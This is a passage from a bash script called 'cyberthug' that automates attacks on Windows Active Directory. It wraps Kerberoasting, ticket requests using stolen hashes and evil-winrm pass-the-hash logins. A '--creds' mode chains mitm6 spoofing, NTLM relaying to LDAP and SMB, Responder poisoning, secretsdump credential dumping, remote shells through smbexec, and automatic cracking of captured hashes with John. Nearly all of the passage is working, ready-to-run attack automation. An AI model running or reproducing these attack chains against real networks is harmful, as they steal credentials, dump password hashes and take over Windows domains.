               GetUserSPNs.py $CLEAN_DOMAIN/$User:$Password -request $dc_host $flag
               echo ""
           elif [[ "$number" == "2" ]]; then
               read_input User $'\033[35mEnter The User : \033[0m'  
               read_input users_file $'\033[35mEnter The Users_File : \033[0m'
               read_input DC $'\033[35mEnter The DC : \033[0m'
               read_input Domain $'\033[35mEnter The Domain : \033[0m'
               read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
               Ip=$(ping -c 1 $Domain | awk -F'[()]' '/PING/{print $2}')
               if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then 
                        flag="-k"
                        dc_host="-dc-host $Domain"
                        dc_ip="--dc-ip $Ip"
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
               elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
               else 
                        flag=""
                        dc_host="" 
                        dc_ip=""        
                        shopt -s extglob nocasematch
                        if [[ $Domain =~ ^(dc[0-9]*\.) ]]; then
                            CLEAN_DOMAIN="${Domain#${BASH_REMATCH[1]}}"
                        else
                            CLEAN_DOMAIN="$Domain"
                        fi
               fi
               echo ""
               echo -e "\033[36m[+]-- Running GetUserSPNs.py -no-preauth $User -usersfile $users_file -dc-host "$DC" $CLEAN_DOMAIN/ --[+]\033[0m"
               echo ""
               GetUserSPNs.py -no-preauth $User -usersfile $users_file -dc-host "$DC" $CLEAN_DOMAIN/
               echo ""
           elif [[ "$number" == "exit" ]]; then
               exit 0
           else
               echo ""
               echo -e "\033[35m[!] Enter a Valid Option\033[0m"
           fi
      done
    elif [[ "$tool" == "8" ]]; then
      while true; do
        history -a "$HISTFILE"
        echo -e "\e[1;35m
        	    _  _____ ____ _____             
	  __ _  ___| ||_   _/ ___|_   _|_ __  _   _ 
 	 / _  |/ _ \ __|| || |  _  | | |  _ \| | | |
        | (_| |  __/ |_ | || |_| | | |_| |_) | |_| |
 	 \__' |\___|\__||_| \____| |_(_) .__/ \__' |
 	 |___/                         |_|    |___/ 

          1) getTGT.py domain/user:password -dc-ip DC -k
          2) getTGT.py domain/user -hashes :hash -dc-ip DC -k
        \e[0m"
        read_input number $'\033[35m# \033[0m'
        if [[ "$number" == ".." ]]; then
             history -a "$HISTFILE"
             exec "$0" "$@"
        elif [[ "$number" == "1" ]]; then
             read_input User $'\033[35mEnter The User : \033[0m'  
             read_input Password $'\033[35mEnter The Password : \033[0m'
             read_input DC $'\033[35mEnter The DC : \033[0m'
             read_input Domain $'\033[35mEnter The Domain : \033[0m'
             sudo ntpdate -s $DC
             echo ""
             echo -e "\033[36m[+]-- Running getTGT.py $Domain/$User:$Password -dc-ip $DC -k --[+]\033[0m"
             echo ""
	     getTGT.py $Domain/$User:$Password -dc-ip $DC -k
	     echo ""
             echo -e "\e[1;32m[*] Export KRB5CCNAME=$User.ccache ... \e[0m"
             export KRB5CCNAME=$User.ccache
             echo ""
             klist
             echo ""
        elif [[ "$number" == "2" ]]; then
 	     read_input User $'\033[35mEnter The User : \033[0m'  
             read_input Hash $'\033[35mEnter The Hash : \033[0m'
             read_input DC $'\033[35mEnter The DC : \033[0m'
             read_input Domain $'\033[35mEnter The Domain : \033[0m'
             sudo ntpdate -s $DC
             echo ""
             echo -e "\033[36m[+]-- Running getTGT.py $Domain/$User -hashes :$Hash -dc-ip $DC -k --[+]\033[0m"
             echo ""
	     getTGT.py $Domain/$User -hashes :$Hash -dc-ip $DC -k
   	     echo ""
             echo -e "\e[1;32m[*] Export KRB5CCNAME=$User.ccache ... \e[0m"
             export KRB5CCNAME=$User.ccache
             echo ""
             klist
             echo ""
	elif [[ "$number" == "exit" ]]; then
               exit 0
        else
               echo ""
               echo -e "\033[35m[!] Enter a Valid Option\033[0m"
        fi
      done 
    elif [[ "$tool" = "9" ]]; then
      while true; do
           history -a "$HISTFILE"
           echo  -e "\033[35m
	               _ _               _                     
             ___ _   _(_) |            _(_)_ __  _ __ _ __ ___ 
 	    / _ \ \ / / | |____\ \ /\ / / | '_ \| '__| '_ ' _  \ 
	   |  __/\ V /| | |_____\ V  V /| | | | | |  | | | | | | 
 	    \___| \_/ |_|_|      \_/\_/ |_|_| |_|_|  |_| |_| |_| 
           \033[0m"
           echo "
               1) evil-winrm -i domain -u user -p password
               2) evil-winrm -i domain -u user -H hash
	       3) evil-winrm -i DC -r domain -u user
           "
           read_input number $'\033[35m# \033[0m'
           if [[ "$number" == ".." ]]; then
               history -a "$HISTFILE"
               exec "$0" "$@"
           elif [[ "$number" == "1" ]]; then
               read_input Domain $'\033[35mEnter The Domain : \033[0m' 
               read_input User $'\033[35mEnter The User : \033[0m' 
               read_input Password $'\033[35mEnter The Password : \033[0m' 
               sudo ntpdate -s $Domain
	       echo ""
     	       echo -e "\033[36m[+]-- Running nxc smb $Domain --generate-krb5-file /tmp/domain-krb5.conf --[+]\033[0m"
    	       echo ""
    	       nxc smb $Domain --generate-krb5-file /tmp/domain-krb5.conf
    	       sudo cp /tmp/domain-krb5.conf /etc/krb5.conf 
    	       echo ""
               echo -e "\e[1;32mConfiguring /etc/krb5.conf ... \e[0m" 
               echo ""
               echo -e "\033[36m[+]-- Running evil-winrm -i $Domain -u $User -p $Password --[+]\033[0m"
               echo ""
	       evil-winrm -i $Domain -u $User -p $Password
               echo ""
           elif [[ "$number" == "2" ]]; then
               read_input Domain $'\033[35mEnter The Domain : \033[0m' 
               read_input User $'\033[35mEnter The User : \033[0m' 
               read_input Hash $'\033[35mEnter The Hash : \033[0m' 
               sudo ntpdate -s $Domain
               echo ""
               echo -e "\033[36m[+]-- Running nxc smb $Domain --generate-krb5-file /tmp/domain-krb5.conf --[+]\033[0m"
               echo ""
               nxc smb $Domain --generate-krb5-file /tmp/domain-krb5.conf
               sudo cp /tmp/domain-krb5.conf /etc/krb5.conf 
               echo ""
               echo -e "\e[1;32mConfiguring /etc/krb5.conf ... \e[0m" 
               echo ""
               echo -e "\033[36m[+]-- Running evil-winrm -i $Domain -u $User -H $Hash --[+]\033[0m"
               echo ""
               evil-winrm -i $Domain -u $User -H $Hash
               echo ""
           elif [[ "$number" == "3" ]]; then
               read_input User $'\033[35mEnter The User : \033[0m' 
               read_input Password $'\033[35mEnter The (Password\Hash) : \033[0m'
               read_input Domain $'\033[35mEnter The Domain : \033[0m' 
               read_input DC $'\033[35mEnter The DC : \033[0m' 
               sudo ntpdate -s $DC
               echo ""
               echo -e "\033[36m[+]-- Running nxc smb $DC --generate-krb5-file /tmp/domain-krb5.conf -k --[+]\033[0m"
               echo ""
               nxc smb $DC --generate-krb5-file /tmp/domain-krb5.conf -k
               sudo cp /tmp/domain-krb5.conf /etc/krb5.conf
               echo ""
               echo -e "\e[1;32mConfiguring /etc/krb5.conf ... \e[0m" 
               echo ""
               echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"
               echo ""
               getTGT.py $Domain/$User -hashes :$Password -dc-ip $DC -k
               getTGT.py $Domain/$User:$Password -dc-ip $DC -k
               echo ""
               echo -e "\e[1;32m[*] Export KRB5CCNAME=$User.ccache ... \e[0m"
               echo "" 
               export KRB5CCNAME=$User.ccache
               echo -e "\033[36m[+]-- Running evil-winrm -i $DC -r $Domain -u $User --[+]\033[0m"
               echo ""
	       evil-winrm -i $DC -r $Domain -u $User
               echo ""
           elif [[ "$number" == "exit" ]]; then
               exit 0
           else
               echo ""
               echo -e "\033[35m[!] Enter a Valid Option\033[0m"
           fi
      done
    elif [[ "$tool" = "10" ]]; then
      while true; do
           history -a "$HISTFILE"
           echo  -e "\033[35m
	 ____                              _               
	|  _ \ _____      _____ _ ____   _(_) _____      __
	| |_) / _ \ \ /\ / / _ \ '__\ \ / / |/ _ \ \ /\ / /
	|  __/ (_) \ V  V /  __/ |   \ V /| |  __/\ V  V / 
	|_|   \___/ \_/\_/ \___|_|    \_/ |_|\___| \_/\_/  

           \033[0m"
           echo "
               1) powerview Domain/User:'Password'@DC
               2) powerview Domain/User:'Password'@DC -k
           "
           read_input number $'\033[35m# \033[0m'
           if [[ "$number" == ".." ]]; then
               history -a "$HISTFILE"
               exec "$0" "$@"
           elif [[ "$number" == "1" ]]; then
               read_input Domain $'\033[35mEnter The Domain : \033[0m' 
               read_input DC $'\033[35mEnter The DC : \033[0m' 
               read_input User $'\033[35mEnter The User : \033[0m' 
               read_input Password $'\033[35mEnter The Password : \033[0m' 
               sudo ntpdate -s $DC
               echo ""
               echo -e "\033[36m[+]-- Running nxc smb $DC --generate-krb5-file /tmp/domain-krb5.conf --[+]\033[0m"
               echo ""
               nxc smb $DC --generate-krb5-file /tmp/domain-krb5.conf
               sudo cp /tmp/domain-krb5.conf /etc/krb5.conf 
               echo ""
               echo -e "\e[1;32mConfiguring /etc/krb5.conf ... \e[0m" 
               echo ""
               echo -e "\033[36m[+]-- Running powerview $Domain/$User:'$Password'@$DC --[+]\033[0m"
               echo ""
	       powerview $Domain/$User:$Password@$DC
               echo ""
           elif [[ "$number" == "2" ]]; then
               read_input Domain $'\033[35mEnter The Domain : \033[0m' 
               read_input DC $'\033[35mEnter The DC : \033[0m' 
               read_input User $'\033[35mEnter The User : \033[0m' 
               read_input Password $'\033[35mEnter The Password : \033[0m' 
               sudo ntpdate -s $DC
               echo ""
               echo -e "\033[36m[+]-- Running nxc smb $DC --generate-krb5-file /tmp/domain-krb5.conf --[+]\033[0m"
               echo ""
               nxc smb $DC --generate-krb5-file /tmp/domain-krb5.conf
               sudo cp /tmp/domain-krb5.conf /etc/krb5.conf 
               echo ""
               echo -e "\e[1;32mConfiguring /etc/krb5.conf ... \e[0m" 
               echo ""
               echo -e "\033[36m[+]-- Running powerview $Domain/$User:'$Password'@$DC -k --[+]\033[0m"
               echo ""
               echo -e "\033[36m[+]-- Getting TGT --[+]\033[0m"
               echo ""
               getTGT.py $Domain/$User:$Password -dc-ip $DC -k
               echo ""
               echo -e "\e[1;32m[*] Export KRB5CCNAME=$User.ccache ... \e[0m"
               echo "" 
               export KRB5CCNAME=$User.ccache
               powerview $Domain/$User:$Password@$DC -k
               echo ""
           elif [[ "$number" == "exit" ]]; then
               exit 0
           else
               echo ""
               echo -e "\033[35m[!] Enter a Valid Option\033[0m"
           fi
      done
    elif [[ "$tool" = "11" ]]; then
      while true; do
           history -a "$HISTFILE"
           echo  -e "\033[35m
  __  _           _ ____       _                  _   _                           
 / _|(_)_ __   __| |  _ \  ___| | ___  __ _  __ _| |_(_) ___  _ __    _ __  _   _ 
| |_ | |  _ \ / _  | | | |/ _ \ |/ _ \/ _  |/ _  | __| |/ _ \|  _ \  |  _ \| | | |
|  _|| | | | | | |_| | |_| |__/ |  __/ (_| | (_| | |_| | (_) | | | |_| |_) | |_| |
|_|  |_|_| |_|\__,_|____/ \___|_|\___|\___ |\__,_|\__|_|\___/|_| |_(_) .__/ \__  |
                                      |___/                          |_|    |___/ 
           \033[0m"
           echo "
               1) findDelegation.py Domain/User:Password -target-domain Domain
               2) findDelegation.py Domain/User:Password -target-domain Domain -k
               3) findDelegation.py Domain/User:Password -target-domain Domain -dc-host DC -k 
           "
           read_input number $'\033[35m# \033[0m'
           if [[ "$number" == ".." ]]; then
               history -a "$HISTFILE"
               exec "$0" "$@"
           elif [[ "$number" == "1" ]]; then
               read_input Domain $'\033[35mEnter The Domain : \033[0m' 
               read_input User $'\033[35mEnter The User : \033[0m' 
               read_input Password $'\033[35mEnter The Password : \033[0m' 
               echo ""
               echo -e "\033[36m[+]-- Running findDelegation.py $Domain/$User:$Password -target-domain $Domain --[+]\033[0m"
               echo ""
	       findDelegation.py $Domain/$User:$Password -target-domain $Domain
               echo "" 
   	   elif [[ "$number" == "2" ]]; then
               read_input Domain $'\033[35mEnter The Domain : \033[0m' 
               read_input User $'\033[35mEnter The User : \033[0m' 
               read_input Password $'\033[35mEnter The Password : \033[0m' 
               echo ""
               echo -e "\033[36m[+]-- Running findDelegation.py $Domain/$User:$Password -target-domain $Domain -k --[+]\033[0m"
               echo ""
               findDelegation.py $Domain/$User:$Password -target-domain $Domain -k
               echo ""
           elif [[ "$number" == "3" ]]; then
               read_input Domain $'\033[35mEnter The Domain : \033[0m' 
               read_input DC $'\033[35mEnter The DC : \033[0m' 
               read_input User $'\033[35mEnter The User : \033[0m' 
               read_input Password $'\033[35mEnter The Password : \033[0m' 
               echo ""
               echo -e "\033[36m[+]-- Running findDelegation.py $Domain/$User:$Password -target-domain $Domain -dc-host $DC -k --[+]\033[0m"
               echo ""
               findDelegation.py $Domain/$User:$Password -target-domain $Domain -dc-host $DC -k 
               echo ""  
           elif [[ "$number" == "exit" ]]; then
               exit 0
           else
               echo ""
               echo -e "\033[35m[!] Enter a Valid Option\033[0m"
           fi
      done    
    elif [[ "$tool" == "exit" ]]; then
         exit 0
    elif [[ -z "$tool" ]]; then
         exec "$0" "$@" 
    else
        echo
        echo -e "\e[1;36m[!] Enter a Valid option\033[0m"
        history -a "$HISTFILE"                   
        exec "$0" "$@" 
    fi
fi
declare -A seen_flags
declare -a valid_flags=("--no-http" "--no-https" "--no-recon" "--no-network" "--no-ping" "--no-portscan" "--creds")
in_array() {
    local needle=$1
    shift
    for element in "$@"; do
        if [[ "$element" == "$needle" ]]; then
            return 0
        fi
    done
    return 1
}
if [[ "$2" == --* ]]; then
    for arg in "${@:2}"; do
       arg=$(echo "$arg" | xargs)  
       if [[ -z "$arg" ]]; then
           continue
       fi
       if in_array "$arg" "${valid_flags[@]}"; then
           if [[ -n "${seen_flags[$arg]}" ]]; then
               echo -e "\e[1;31m[+]--- Flag '$arg' is repeated ---[+]\e[0m"
               exit 1
           else
               seen_flags["$arg"]=true
           fi

           case "$arg" in
               "--no-http") flag_1=true ;;
               "--no-https") flag_2=true ;;
               "--no-recon") flag_3=true ;;
               "--no-network") flag_4=true ;;
               "--no-ping") flag_5=true ;;
               "--no-portscan") flag_6=true ;;
               "--creds") flag_7=true ;;
           esac
       else
           echo -e "\e[1;31m[+]--- For Usage : cyberthug -h ---[+]\e[0m"
           exit 1
       fi
    done
else
    for arg in "${@:3}"; do
       arg=$(echo "$arg" | xargs)  
       if [[ -z "$arg" ]]; then
           continue
       fi
       if in_array "$arg" "${valid_flags[@]}"; then
           if [[ -n "${seen_flags[$arg]}" ]]; then
               echo -e "\e[1;31m[+]--- Flag '$arg' is repeated ---[+]\e[0m"
               exit 1
           else
               seen_flags["$arg"]=true
           fi

           case "$arg" in
               "--no-http") flag_1=true ;;
               "--no-https") flag_2=true ;;
               "--no-recon") flag_3=true ;;
               "--no-network") flag_4=true ;;
               "--no-ping") flag_5=true ;;
               "--no-portscan") flag_6=true ;;
               "--creds") flag_7=true ;;
           esac
       else
           echo -e "\e[1;31m[+]--- For Usage : cyberthug -h ---[+]\e[0m"
           exit 1
       fi
    done
fi
if [ -z "$1" ]; then
    echo -e "\e[1;31m[+]--- For Usage : cyberthug -h ---[+]\e[0m"
    exit 1
fi
if [ "$1" == "-h" ]; then
    help
    exit 1
fi
if [[ "$2" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo -e "\e[1;31m[+]--- For Usage : cyberthug -h ---[+]\e[0m"
    exit 1
fi
if [ "$2" != "" ]; then
    if [[ "$2" == --* ]]; then
        DOMAIN=$1
        HOSTS_ENTRY=""
        DC=$1
    else
        DC=""
        full_string=$2 
        DOMAIN="${full_string%% *}"
        for word in $2; do
          if [[ "$word" =~ ^[dD][cC] ]]; then
            DC="$word"
            break
          fi
        done
        if [[ "$DC" = "" ]]; then
             DC=$DOMAIN
        fi
        HOSTS_ENTRY=$1
        echo "$1 $2" | sudo tee -a /etc/hosts > /dev/null
        echo ""
        echo -e "\e[1;32m$1 $2 ⇒  /etc/hosts\e[0m"
        echo "--------------------------"
    fi
else
    DOMAIN=$1
    HOSTS_ENTRY=""
    DC=$1
fi 
if [ ! -d "$HOME/CyberThug_output" ]; then
    mkdir -p "$HOME/CyberThug_output"
    echo "" 
    echo -e "\e[1;3m\e[1;32m[+]-- $HOME/CyberThug_output Folder Created --[+]\e[0m\e[0m"
    echo ""

fi
if [[ "$flag_7" = true ]]; then
    DATE=$(date +%F_%H-%M-%S)
    mkdir -p $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN
    read_input User $'\033[35mEnter The User : \033[0m' 
    read_input Password $'\033[35mEnter The Password : \033[0m' 
    read_input DC $'\033[35mEnter The DC : \033[0m' 
    history -a "$HISTFILE"
    sudo ntpdate -s $DC 
    Ip=$(ping -c 1 $DOMAIN | awk -F'[()]' '/PING/{print $2}')
    read_input Kerberos $'\033[35mKerberos Authentication (y/n) : \033[0m'
    if [[ $Kerberos == "Y" || $Kerberos == "y" ]]; then
         flag="-k"
         dc_host="-dc-host $DC"
         dc_ip="--dc-ip $Ip"
	 shopt -s extglob nocasematch
	 if [[ $DOMAIN =~ ^(dc[0-9]*\.) ]]; then
    	      CLEAN_DOMAIN="${DOMAIN#${BASH_REMATCH[1]}}"
	 else
    	      CLEAN_DOMAIN="$DOMAIN"
	 fi
    elif [[ $Kerberos == "N" || $Kerberos == "n" ]]; then
         flag=""
         dc_host="" 
         dc_ip=""        
         if [[ $DOMAIN =~ ^(dc[0-9]*\.) ]]; then
              CLEAN_DOMAIN="${DOMAIN#${BASH_REMATCH[1]}}"
         else
              CLEAN_DOMAIN="$DOMAIN"
         fi
    else 
         flag=""
         dc_host="" 
         dc_ip=""        
         if [[ $DOMAIN =~ ^(dc[0-9]*\.) ]]; then
              CLEAN_DOMAIN="${DOMAIN#${BASH_REMATCH[1]}}"
         else
              CLEAN_DOMAIN="$DOMAIN"
         fi
    fi            
    echo ""
    echo -e "\033[36m[+]-- Running nxc smb $DC --generate-krb5-file /tmp/domain-krb5.conf $flag --[+]\033[0m"
    echo ""
    nxc smb $DC --generate-krb5-file /tmp/domain-krb5.conf $flag
    sudo cp /tmp/domain-krb5.conf /etc/krb5.conf
    echo ""
    echo -e "\033[36m[+] Configuring /etc/krb5.conf ... \033[0m" 
    echo ""
ntlmrelay_mitm6(){
gnome-terminal -- bash -c "
echo -e '\033[36m[+]-- Running Mitm6 Attack --[+]\033[0m'
echo ''

DOMAIN=\"'$DOMAIN'\"
DATE=\"'$DATE'\"
Ip=\"'$Ip'\"
CLEAN_DOMAIN=\"'$CLEAN_DOMAIN'\"
Kerberos=\"'$Kerberos'\"
DC=\"'$DC'\"

interfaces=()
while IFS= read -r line; do
    interfaces+=(\"\$line\")
done < <(ip -4 -o addr show up | awk '{print \$2\":\"\$4}' | sed 's#/.*##')

echo -e '\n[*] Available interfaces:'
echo ''
for i in \"\${!interfaces[@]}\"; do
    echo \"  [\$i] \${interfaces[\$i]}\"
done
echo ''
read -p 'Enter the number of the interface to use for Responder: ' index
interface=\$(echo \"\${interfaces[\$index]}\" | cut -d':' -f1 | xargs)
echo ''
echo -e \"[*] You selected interface: \$interface\"

gnome-terminal -- bash -c '
echo \"\"
read -p \"Do you need to escalate a user? (y/n): \" ans
echo \"\"
if [[ \$ans == \"Y\" || \$ans == \"y\" ]]; then
    read -p \"Enter the User to escalate: \" U
    read -p \"Enter the user'\''s password: \" P
fi

if [[ -z \"\$U\" ]]; then
    esc_user=\"\"
else
    esc_user=\"--escalate-user \$U --delegate-access\"
fi

echo \"\"
echo -e \"\n1) ldap\n2) ldaps\n\"
echo \"\"
read -p \"Choose (1 or 2): \" ch
echo \"\"
if [[ \$ch == \"1\" ]]; then
    ch1=\"ldap\"
else
    ch1=\"ldaps\"
fi

rand=\$((RANDOM))

ntlmrelayx.py -6 -wh internal-\$rand.'"$DOMAIN"' -t \$ch1://$DC -l mitm6_loot_'"$DOMAIN"'_'"$DATE"' --no-smb-server --add-computer --dump-hashes \$esc_user 2>&1 | \\
while IFS= read -r line; do
    echo \"\$line\"

    if [[ \"\$line\" =~ ([a-zA-Z0-9._-]+)\ can\ now\ impersonate\ users\ on\ ([A-Z0-9\\\\._\\\$-]+) ]]; then
        esc_user_name=\"\${BASH_REMATCH[1]}\"
        esc_computer_raw=\"\${BASH_REMATCH[2]}\"
        esc_computer=\$(echo \"\$esc_computer_raw\" | sed \"s/.*\\\\\\\\//\" | sed \"s/\\\$//\")
	c_computer=\${esc_computer%\$}        
	ip_c=\$(ping -c 1 \"\$c_computer\" 2>/dev/null | sed -n \"s/^PING[^(]*(\\([0-9.]*\\)).*/\\1/p\")
        if [ -z \"\$ip_c\" ]; then
	   echo \" ** Add \$c_computer to /etc/hosts \"	
	else        
           gnome-terminal -- bash -c \"secretsdump.py \$esc_computer/\$esc_user_name:\$P@\$ip_c ; secretsdump.py \$esc_computer/\$esc_user_name:\$P@\$ip_c > /tmp/secretsdump_--creds_'\"$DATE\"'_\$esc_computer ; cp /tmp/secretsdump_--creds_'\"$DATE\"'_\$esc_computer $HOME/CyberThug_output/cyberthug_--creds_output/'\"$DOMAIN\"' ; exec bash\"
        fi
    fi
done
cp -r mitm6_loot_'"$DOMAIN"'* $HOME/CyberThug_output/cyberthug_--creds_output/'"$DOMAIN"'
exec bash
'
gnome-terminal -- bash -c \"sudo mitm6 -i \$interface -d $DOMAIN; exec bash\"

exec bash
"
sleep 5
gnome-terminal -- bash -c '
echo -e "\033[36m[+]-- Running SMBRelayAttack --[+]\033[0m"
echo ""
DOMAIN="'"$DOMAIN"'"
DATE="'"$DATE"'"
Ip="'"$Ip"'"
CLEAN_DOMAIN="'"$CLEAN_DOMAIN"'"
Kerberos="'"$Kerberos"'"
DC="'"$DC"'"

nxc smb $DOMAIN | grep "signing:" | awk "{print \$16}" | tr -d ")" | sed "s/(signing://" > /tmp/smb_signing
signing_status=$(cat /tmp/smb_signing) 

if [[ "$signing_status" == "False" || "$signing_status" == "false" ]]; then
    nxc smb $DOMAIN | grep "(signing:False)" | awk "{print \$2}" > /tmp/targets_creds.txt
    interfaces=()
    while IFS= read -r line; do
        interfaces+=("$line")
    done < <(ip -4 -o addr show up | awk "{print \$2 \":\" \$4}" | sed "s#/.*##")
    echo -e "\n[*] Available interfaces:"
    echo ""
    for i in "${!interfaces[@]}"; do
        echo "  [$i] ${interfaces[$i]}"
    done
    echo ""
    read -p "Enter the number of the interface to use for Responder: " index
    interface=$(echo "${interfaces[$index]}" | cut -d":" -f1 | xargs)
    echo "[*] You selected interface: $interface"
    echo ""
    echo -e "\033[36m[*] Disabling SMB and HTTP servers in Responder config \033[0m"
    sudo sed -i "/^SMB *=/ c\\SMB     = off" /etc/responder/Responder.conf
    sudo sed -i "/^HTTP *=/ c\\HTTP    = off" /etc/responder/Responder.conf
    echo -e "\033[36m[*] Current Responder config (SMB/HTTP): \033[0m"
    echo ""
    grep -E --color=always "^(SMB|HTTP) *=.*" /etc/responder/Responder.conf
    echo
    echo -e "\033[36m[*] Starting Responder in background \033[0m"
    echo "" 
    gnome-terminal -- bash -c "sudo responder -I $interface ; exec bash"
    echo ""
    echo -e "\033[36m[*] Starting ntlmrelayx with expect script \033[0m"
    echo ""
    target=$(cat /tmp/targets_creds.txt)
    expect << EOD
      log_user 1
      sleep 8
      spawn ntlmrelayx.py -tf /tmp/targets_creds.txt -of SAMhashes -smb2support -socks --keep-relaying --no-http-server  --no-wcf-server --no-raw-server
      set targets {}
      expect {
         eof { exit }

         -re "ntlmrelayx>" {
            sleep 10
            send "socks\r"
            exp_continue
         }

         -re {\s*SMB\s+(\S+)\s+(\S+)\s+(TRUE|FALSE)\s+445} {
            set Username \$expect_out(2,string)
            if {[lsearch \$targets \$Username] == -1} {
                lappend targets \$Username 
                exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; cp SAMhashes_ntlmv2 $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/SAMhashes_smbrelay_ntlmv2_$DATE 2>/dev/null ; cp SAMhashes_ntlm $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/SAMhashes_smbrelay_ntlm_$DATE 2>/dev/null ; sleep 2 ; proxychains -q smbexec.py -no-pass \$Username@$target -debug ; exec bash"
                exec gnome-terminal -- bash -c "sleep 5 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q secretsdump.py -no-pass \$Username@$target -debug ; proxychains -q secretsdump.py -no-pass \$Username@$target > /tmp/secretsdump_--creds_$DOMAIN ; cp /tmp/secretsdump_--creds_$DOMAIN $HOME/CyberThug_output/cyberthug_--creds_output/$DOMAIN/secretsdump_--creds_$DATE ; exec bash" 
		exec gnome-terminal -- bash -c "sleep 2 ; echo '====================' ; echo \$Username ; echo '====================' ; echo '' ; proxychains -q smbclient.py -no-pass \$Username@$target ; exec bash"
            }    
            exp_continue
           } 
         }
EOD
else
    echo -e "\033[36m[!] SMB signing is enabled. No action taken \033[0m"
    echo ""
    echo -e "\033[36m===================================================\033[0m"
    echo ""
    interfaces=()
    while IFS= read -r line; do
        interfaces+=("$line")
    done < <(ip -4 -o addr show up | awk "{print \$2 \":\" \$4}" | sed "s#/.*##")
    echo -e "\n[*] Available interfaces:"
    echo ""
    for i in "${!interfaces[@]}"; do
        echo "  [$i] ${interfaces[$i]}"
    done
    echo ""
    read -p "Enter the number of the interface to use for Responder: " index
    interface=$(echo "${interfaces[$index]}" | cut -d":" -f1 | xargs)
    echo "[*] You selected interface: $interface"
    echo ""
    echo -e "\033[36m[*] Disabling SMB and HTTP servers in Responder config \033[0m"
    sudo sed -i "/^SMB *=/ c\\SMB     = On" /etc/responder/Responder.conf
    sudo sed -i "/^HTTP *=/ c\\HTTP    = On" /etc/responder/Responder.conf
    echo -e "\033[36m[*] Current Responder config (SMB/HTTP): \033[0m"
    echo ""
    grep -E --color=always "^(SMB|HTTP) *=.*" /etc/responder/Responder.conf
    echo ""
    gnome-terminal -- bash -c "echo '====================' ; echo Running Responder ; echo '====================' ; echo '' ; sudo responder -I $interface ; exec bash"
LOG_DIR="/usr/share/responder/logs"
JOHN_INPUT="/tmp/responder_john_input.txt"
WORDLIST="/usr/share/wordlists/rockyou.txt"
CRACKED_TRACKER="$HOME/.cracked_hashes.txt"
JOHN_OUTPUT="/tmp/john_cracked.txt"

echo "[*] Monitoring Responder logs and cracking NEW hashes with John ..."
touch "$CRACKED_TRACKER"
echo ""

while true; do
    > "$JOHN_INPUT"
    grep -h "NTLMv2-SSP Hash" "$LOG_DIR"/* 2>/dev/null | \
    awk -F "Hash     : " '"'"'{print $2}'"'"' | sort -u | while read -r hash; do
        if ! grep -qF "$hash" "$CRACKED_TRACKER"; then
            echo "$hash" >> "$JOHN_INPUT"
            echo "" 
            echo "$hash" >> "$CRACKED_TRACKER"
        fi
    done

    if [[ -s "$JOHN_INPUT" ]]; then
        echo "[+] New hashes found! Running John..."
        john --format=netntlmv2 "$JOHN_INPUT" --wordlist="$WORDLIST" > /dev/null
        john --show --format=netntlmv2 "$JOHN_INPUT" > "$JOHN_OUTPUT"
        echo "[*] Cracked credentials:"
        echo "" 
        cat "$JOHN_OUTPUT"
        echo ""

        awk -F: '"'"'$2 && $2 !~ /^[A-F0-9]{32,}$/ {user=$1; pass=$2; print user, pass}'"'"' "$JOHN_OUTPUT" | while read -r user p; do
            echo ""
            gnome-terminal -- bash -c "
echo '=========================================' 
echo  Launching Gnomes For $user with $p
echo '=========================================' 
echo '' 
for i in {1..15}; do
    dots=\$(( (i - 1) % 3 + 1 ))
    echo -ne \"\r\033[36mLoading\$(printf \"%-\${dots}s\" | tr \" \" \".\")\033[0m\"
    sleep 0.3
done
echo ''
gnome-terminal -- expect -c \"
spawn s -t
send \\\"0\\r$CLEAN_DOMAIN\\r$user\\r$p\\r$Ip\\r$DC\\r$Kerberos\\r\\\"
interact
\"
gnome-terminal -- bash -c \"
echo -e \\\"\\\e[1;32m[+] User: $user \e[0m\\\"
echo -e \\\"\\\e[1;32m[+] Password: $p \e[0m\\\"
echo -e \\\"\\\e[1;32m[+] DC: $DC \e[0m\\\"
echo -e \\\"\\\e[1;32m[+] Domain: $DOMAIN  \e[0m\\\"
echo -e \\\"\\\e[1;32m[+] Trying powerview direct auth for $user  ...\e[0m\\\"
echo ''
echo -e \\\"\\\e[1;32m[+]-- Running powerview $CLEAN_DOMAIN/$user:$p@$DC --[+]\e[0m\\\"
echo ''
expect -c \\\"set timeout -1
set send_slow {1 .001}
spawn powerview $CLEAN_DOMAIN/$user:$p@$DC
expect -re {PV.*❯};
send -s \\\\\\\"Get-Domain\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -spn -Properties servicePrincipalName\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -PreAuthNotRequired\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainUser -Admincount -Properties Samaccountname,memberof,description\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainComputer -Properties name,operatingSystem,samaccountname\\\\\\\\r\\\\\\\";
expect -re {PV.*❯};
send -s \\\\\\\"Get-DomainGroup\\\\\\\\r\\\\\\\";
